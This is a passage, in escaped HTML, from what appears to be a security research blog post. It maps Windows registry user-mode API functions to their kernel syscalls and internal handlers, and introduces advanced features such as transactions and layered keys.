 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Set key information&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtSetInformationKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Query key information&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw&quot;&gt;RegQueryInfoKey&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtQueryKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Enumerate subkeys&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenumkeyexw&quot;&gt;RegEnumKeyEx&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtEnumerateKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Notify on key change&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regnotifychangekeyvalue&quot;&gt;RegNotifyChangeKeyValue&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtNotifyChangeKey&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtNotifyChangeMultipleKeys&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Query key path&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtQueryObject&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;CmpQueryKeyName&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Close key handle&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey&quot;&gt;RegCloseKey&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtClose&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;CmpCloseKeyObject&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;CmpDeleteKeyObject&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Set value&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexw&quot;&gt;RegSetValueEx&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtSetValueKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Delete value&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletevaluew&quot;&gt;RegDeleteValue&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtDeleteValueKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Enumerate values&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenumvaluew&quot;&gt;RegEnumValue&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtEnumerateValueKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Query value data&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexw&quot;&gt;RegQueryValueEx&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtQueryValueKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Query multiple values&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regquerymultiplevaluesw&quot;&gt;RegQueryMultipleValues&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtQueryMultipleValueKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Some additional comments:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_48bktl3sehd-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;A regular user can directly load only application hives, using the RegLoadAppKey function or its corresponding syscalls with the REG_APP_HIVE flag.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Loading standard hives, using the RegLoadKey function, is reserved for administrators only.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, this operation is still indirectly accessible to other users through the NTUSER.MAN hive and the Profile Service, which can load it as a user hive during system login.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;When selecting API functions for the table above, I prioritized their latest versions (often with the &amp;quot;Ex&amp;quot; suffix, meaning &amp;quot;extended&amp;quot;).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I also chose those that are the thinnest wrappers and closest in functionality to their corresponding syscalls on the kernel side.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the official Microsoft documentation, you&amp;#39;ll also find many older/deprecated versions of these functions, which were available in early Windows versions and now exist solely for backward compatibility (e.g., &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyw&quot;&gt;RegOpenKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenumkeyw&quot;&gt;RegEnumKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, there are also helper functions that implement more complex logic on the user-mode side (e.g., &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletetreew&quot;&gt;RegDeleteTree&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which recursively deletes an entire subtree of a given key)&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;, but they don&amp;#39;t add anything in terms of the kernel attack surface.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;There are several operations natively supported by the kernel that do not have a user-mode equivalent, such as NtQueryOpenSubKeys or NtSetInformationKey.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The only way to use these interfaces is to call their respective system calls directly, which is most easily achieved by calling their wrappers with the same name in the ntdll.dll library.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Furthermore, even when a documented API function exists, it may not expose all the capabilities of its corresponding system call.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, the RegQueryKeyInfo function returns some information about a key, but much more can be learned by using NtQueryKey directly with one of the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_key_information_class&quot;&gt;supported information classes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Moreover&lt;/span&gt;&lt;span&gt;, there is a group of syscalls that do require administrator rights (specifically SeBackupPrivilege, SeRestorePrivilege, or PreviousMode set to KernelMode).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These syscalls are used either for registry management by the kernel or system services, or for purely administrative tasks (such as performing registry backups).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;They are not particularly interesting from a security research perspective, as they cannot be used to elevate privileges, but it is worth mentioning them by name:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_fdfj2vkv7eng-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtCompactKeys&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtCompressKey&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtFreezeRegistry&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtInitializeRegistry&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtLockRegistryKey&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtQueryOpenSubKeysEx&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtReplaceKey&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtRestoreKey&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtSaveKey&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtSaveKeyEx&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtSaveMergedKeys&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtThawRegistry&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtUnloadKey&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtUnloadKey2&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtUnloadKeyEx&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.1feye8rlrcn1&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Incorporating advanced features&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Despite the fact that most power users are familiar with the basic registry operations (e.g., from using Regedit.exe), there are still some modifiers that can change the behavior of these operations, thereby complicating their implementation and potentially leading to interesting bugs.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To use these modifiers, additional steps are often required, such as enabling registry virtualization, creating a transaction, or loading a differencing hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;When this is done, the information about the special key properties are encoded within the internal kernel structures, and the key handle itself is almost indistinguishable from other handles as seen by the user-mode application.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;When operating on such advanced keys, the logic for their handling is executed in the standard registry syscalls transparently to the user.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The diagram below illustrates the general, conceptual control flow in registry-related system calls&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c44 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjRqzcz7iy4f_VInnShLktZFw57BgHzNj92aYfPvNlyHbQcxdkbl-9vr3XGVpwzA_kDSrFJFNxuZyzbI5Gn8eQi7jfkC2-GIG72PvfBlast_IQFbgZkwMv4opwG3KcqCMaDNXfpNtRWiERH5Zg40xdaKNPjnhxKGEIqfbpFlCy5HcoLRMJHEVdGOyTF8o/s1454/image1.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjRqzcz7iy4f_VInnShLktZFw57BgHzNj92aYfPvNlyHbQcxdkbl-9vr3XGVpwzA_kDSrFJFNxuZyzbI5Gn8eQi7jfkC2-GIG72PvfBlast_IQFbgZkwMv4opwG3KcqCMaDNXfpNtRWiERH5Zg40xdaKNPjnhxKGEIqfbpFlCy5HcoLRMJHEVdGOyTF8o/s1200/image1.png&quot; border=&quot;0&quot; alt=&quot;A flowchart outlines a system process beginning with input argument checks and referencing key handles. An internal operation handler then makes decisions based on whether a key is layered or transacted, leading to specific logic paths. The process concludes with copying output data and invoking post registry callbacks before stopping.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A flowchart outlines a system process beginning with input argument checks and referencing key handles. An internal operation handler then makes decisions based on whether a key is layered or transacted, leading to specific logic paths. The process concludes with copying output data and invoking post registry callbacks before stopping.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This is a very simplified outline of how registry syscalls work, but it shows that a function theoretically supporting one operation can actually hide many implementations that are dynamically chosen based on various factors.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In terms of specifics, there are significant differences depending on the operation and whether it is a &amp;quot;read&amp;quot; or &amp;quot;write&amp;quot; one.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, in &amp;quot;read&amp;quot; operations, the execution paths for transactional and non-transactional operations are typically combined into one that has built-in transaction support but can also operate without them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;On the other hand, in &amp;quot;write&amp;quot; operations, normal and transactional operations are always performed differently, but there isn&amp;#39;t much code dedicated to layered keys (except for the so-called key &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;promotion&lt;/span&gt;&lt;span&gt;&amp;nbsp;operations), since when writing to a layered key, the state of keys lower on the stack is usually not as important.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As for the &amp;quot;Internal operation handler&amp;quot; area marked within the large rectangle with the dotted line, these are internal functions responsible for the core logic of a specific operation, and whose names typically begin with &amp;quot;Cm&amp;quot; instead of &amp;quot;Nt&amp;quot;. For example, for the NtDeleteKey syscall, the corresponding internal handler is CmDeleteKey, for NtQueryKey it is CmQueryKey, for NtEnumerateKey it is 